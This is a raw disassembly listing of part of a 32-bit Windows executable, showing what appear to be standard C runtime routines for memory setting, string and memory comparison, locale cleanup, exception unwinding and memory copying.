  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
